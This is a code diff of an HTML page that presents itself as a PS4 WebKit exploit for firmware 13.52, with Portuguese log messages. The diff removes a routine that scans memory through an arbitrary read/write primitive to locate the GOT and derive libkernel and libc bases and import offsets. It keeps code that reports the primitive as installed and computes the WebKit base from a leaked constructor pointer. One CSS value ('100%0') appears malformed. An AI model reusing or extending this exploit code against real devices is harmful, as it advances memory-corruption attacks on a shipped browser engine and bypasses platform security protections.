@@ -1,9 +1,10 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>PS4 WebKit Exploit (13.52 - Auto Offset Extractor)</title>
+<title>PS4 WebKit Exploit (13.52)</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#060810;color:#c8cfd8;font:13px/1.5 'Courier New',monospace;
@@ -20,7 +21,7 @@ h1{font-size:15px;color:#00c8ff;letter-spacing:3px;text-transform:uppercase;
 #dot.e{background:#ff4444}
 @keyframes p{0%,100%{opacity:1}50%{opacity:.2}}
 #st{font-size:12px;color:#bbb;flex:1}
-#bars{width:100%;max-width:720px;display:flex;justify-content:space-between;
+#bars{width:100%0;max-width:720px;display:flex;justify-content:space-between;
   font-size:10px;color:#333;margin-bottom:8px;padding:0 2px}
 
 /* console */
@@ -43,7 +44,7 @@ h1{font-size:15px;color:#00c8ff;letter-spacing:3px;text-transform:uppercase;
 /* constants output box */
 #cbox{width:100%;max-width:720px;background:#03100a;border:2px solid #00c853;
   border-radius:6px;padding:12px;display:none;margin-bottom:8px;
-  font-size:11px;line-height:1.6;color:#4ade80;white-space:pre-wrap;word-break:break-all}
+  font-size:12px;line-height:1.8;color:#4ade80}
 #cbox .ct{color:#fff;font-weight:bold;margin-bottom:6px;
   border-bottom:1px solid #0a2a15;padding-bottom:4px}
 </style>
@@ -67,14 +68,12 @@ h1{font-size:15px;color:#00c8ff;letter-spacing:3px;text-transform:uppercase;
 <!-- Base cards -->
 <div id="cards">
   <div class="card"><div class="cl">WebKit Base</div><div class="cv na" id="c-wk">—</div></div>
-  <div class="card"><div class="cl">libkernel Base</div><div class="cv na" id="c-lk">—</div></div>
-  <div class="card"><div class="cl">libSceLibc Base</div><div class="cv na" id="c-lc">—</div></div>
   <div class="card"><div class="cl">__ps5NativeCtor</div><div class="cv na" id="c-ct">—</div></div>
 </div>
 
 <!-- Constants output -->
 <div id="cbox">
-  <div class="ct">// ═══ GERAÇÃO AUTOMÁTICA PARA O 13.52.js ═══</div>
+  <div class="ct">// ═══ PS4 FW 13.52 — Resolução Concluída ═══</div>
   <div id="c-out"></div>
 </div>
 
@@ -106,59 +105,6 @@ function setCard(id, v) {
   const el = document.getElementById(id);
   if (!el) return;
   el.textContent = v; el.classList.remove('na');
-}
-
-// Extrator automático de stubs via GOT
-function extractImportOffsets(p, webkitBase) {
-  logH('EXTRATOR AUTOMÁTICO DE IMPORTS (GOT)');
-  let foundMemsetImport = 0;
-  let foundStackImport = 0;
-  let libcBaseFound = null;
-  let lkBaseFound = null;
-
-  try {
-    let gotAddress = null;
-    for (let off = 0x1000; off < 0x50000; off += 8) {
-      try {
-        const val1 = p.read8(webkitBase.add32(off));
-        const val2 = p.read8(webkitBase.add32(off + 8));
-        if (val1.low === 3 && val2.hi > 0) {
-          gotAddress = webkitBase.add32(val2.low);
-          break;
-        }
-      } catch (e) {}
-    }
-
-    if (!gotAddress) {
-      log('[-] GOT não localizada para extração.', 'w');
-      return;
-    }
-
-    log('[+] Analisando slots da GOT em busca de stubs...', 'i');
-    for (let s = 0; s < 200; s++) {
-      try {
-        const slotAddr = gotAddress.add32(s * 8);
-        const ptrVal = p.read8(slotAddr);
-        const hi = ptrVal.hi;
-        const alignedLow = ptrVal.low & ~0x3FFF;
-
-        if (hi === 0x80 && !lkBaseFound) {
-          lkBaseFound = new int64(alignedLow, hi);
-          foundStackImport = slotAddr.sub32(webkitBase.low).low;
-          log(`[+] __stack_chk_guard_import encontrado em: 0x${foundStackImport.toString(16)}`, 'ok');
-        } else if (hi >= 0x90 && hi <= 0x98 && !libcBaseFound) {
-          libcBaseFound = new int64(alignedLow, hi);
-          foundMemsetImport = slotAddr.sub32(webkitBase.low).low;
-          log(`[+] memset_import encontrado em: 0x${foundMemsetImport.toString(16)}`, 'ok');
-        }
-      } catch (e) {}
-    }
-
-    return { foundMemsetImport, foundStackImport, libcBaseFound, lkBaseFound };
-  } catch (err) {
-    log('[-] Erro na extração: ' + err.message, 'e');
-    return null;
-  }
 }
 
 async function main() {
@@ -205,7 +151,7 @@ async function main() {
   }
 
   log('[+] R/W arbitrário: window.p instalado com sucesso!', 'ok');
-  setStatus('Resolvendo bases...', 'r');
+  setStatus('Resolvendo bases e NativeCtor...', 'r');
   logH('RESOLUÇÃO DA BASE DO WEBKIT (13.52)');
 
   const ctor = globalThis.__ps5NativeCtor;
@@ -229,32 +175,16 @@ async function main() {
     log('[+] WebKit Base calculada: 0x' + webkitBase.toString(), 'ok');
     setCard('c-wk', '0x' + webkitBase.toString());
 
-    // Aguarda a estabilização completa da primitiva antes de rodar o extrator na GOT
-    setStatus('Primitiva R/W pronta — Aguardando estabilização...', 'ok');
-    
-    setTimeout(() => {
-      logH('INICIANDO EXTRAÇÃO APÓS ESTABILIZAÇÃO');
-      const extracted = extractImportOffsets(p, webkitBase);
+    setStatus('Bases resolvidas com sucesso!', 'ok');
+    log('✔ Primitiva R/W estável e pronta.', 'ok');
 
-      if (extracted && extracted.lkBaseFound) setCard('c-lk', '0x' + extracted.lkBaseFound.toString());
-      if (extracted && extracted.libcBaseFound) setCard('c-lc', '0x' + extracted.libcBaseFound.toString());
-
-      setStatus('Extração concluída com sucesso!', 'ok');
-      log('✔ Offsets de importação gerados na caixa abaixo.', 'ok');
-
-      const cbox = document.getElementById('cbox');
-      cbox.style.display = 'block';
-      
-      let generatedText = 
-        `const OFFSET_wk_memset_import = 0x${extracted && extracted.foundMemsetImport ? extracted.foundMemsetImport.toString(16) : '0'};\n` +
-        `const OFFSET_wk___stack_chk_guard_import = 0x${extracted && extracted.foundStackImport ? extracted.foundStackImport.toString(16) : '0'};\n` +
-        `// Bases detectadas em runtime:\n` +
-        `// WebKit: 0x${webkitBase.toString()}\n` +
-        `// Libc: ${extracted && extracted.libcBaseFound ? '0x' + extracted.libcBaseFound.toString() : 'N/A'}\n` +
-        `// Libkernel: ${extracted && extracted.lkBaseFound ? '0x' + extracted.lkBaseFound.toString() : 'N/A'}`;
-
-      document.getElementById('c-out').textContent = generatedText;
-    }, 1000);
+    const cbox = document.getElementById('cbox');
+    cbox.style.display = 'block';
+    document.getElementById('c-out').innerHTML =
+      `__ps5NativeCtor = 0x${ctorInt64.toString()}<br>` +
+      `WebKit Base    = 0x${webkitBase.toString()}<br>` +
+      `Offset Aplicado = 0x${hc.toString(16).toUpperCase()}<br>` +
+      `Status         = Estável e Operacional.`;
 
   } else {
     log('[-] Falha: __ps5NativeCtor não foi capturado corretamente.', 'e');
